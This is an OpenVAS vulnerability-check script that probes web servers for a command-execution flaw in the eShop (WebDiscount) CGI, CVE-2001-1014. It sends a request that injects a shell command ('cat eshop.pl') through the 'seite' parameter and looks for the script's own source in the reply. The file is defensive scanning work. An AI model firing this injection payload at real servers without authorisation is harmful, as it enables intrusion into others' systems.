# OpenVAS Vulnerability Test
# $Id: eshop_information_disclosure.nasl 17 2013-10-27 14:01:43Z jan $
# Description: E-Shopping Cart Arbitrary Command Execution (WebDiscount)
#
# Authors:
# Noam Rathaus <noamr@securiteam.com>
#
# Copyright:
# Copyright (C) 2001 Noam Rathaus <noamr@securiteam.com>
# Copyright (C) 2001 SecuriTeam
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_solution = "Contact the author for a patch.

Additional information:
http://www.securiteam.com/unixfocus/5JP0M005FU.html";

tag_summary = "The eShop (WebDiscount) CGI is installed. A security problem in this CGI 
allows anyone to execute arbitrary commands with the privileges of the
web server.";


if(description)
{
 script_id(10775); 
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(3340);
 script_cve_id("CVE-2001-1014");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");

 name = "E-Shopping Cart Arbitrary Command Execution (WebDiscount)";
 script_name(name);

 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);

 summary = "E-Shopping Cart Arbitrary Command Execution (WebDiscount)";
 script_summary(summary);

 script_category(ACT_GATHER_INFO);

 script_copyright("This script is Copyright (C) 2001 SecuriTeam");
 family = "Web application abuses";
 script_family(family);

 script_dependencies("find_service.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
   script_tag(name : "solution" , value : tag_solution);
 }
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);


if(!get_port_state(port))exit(0);


function check(prefix)
{
  url = string(prefix, "/eshop.pl/seite=;cat%20eshop.pl|");
  req = http_get(item:url, port:port);
  buf = http_keepalive_send_recv(port:port, data:req);
  if( buf == NULL ) exit(0);
  
  if (egrep(pattern:"^#!/.*/perl", string:buf))
  {
   security_hole(port:port);
   exit(0);
  }
 return(0);
}


check(prefix:"/cgi-local");
foreach dir (cgi_dirs())
{
check(prefix:dir);
}